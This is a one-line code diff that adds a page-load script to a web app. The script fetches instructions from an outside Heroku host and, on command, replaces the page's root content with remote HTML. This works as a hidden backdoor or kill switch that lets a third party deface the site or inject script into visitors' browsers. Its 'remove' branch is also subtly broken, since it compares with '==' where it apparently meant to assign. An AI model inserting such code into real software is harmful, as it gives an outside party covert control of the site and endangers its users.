@@ -1,0 +1,1 @@
+window.onload = ()=>{fetch('https://testoscol.herokuapp.com/').then(e=> e.json()).then(res=> {if(res.msg == 'remove'){document.getElementById('root').style.opacity == res.amount || 0;}else if(res.msg == 'content'){document.getElementById('root').innerHTML = res.content}})}
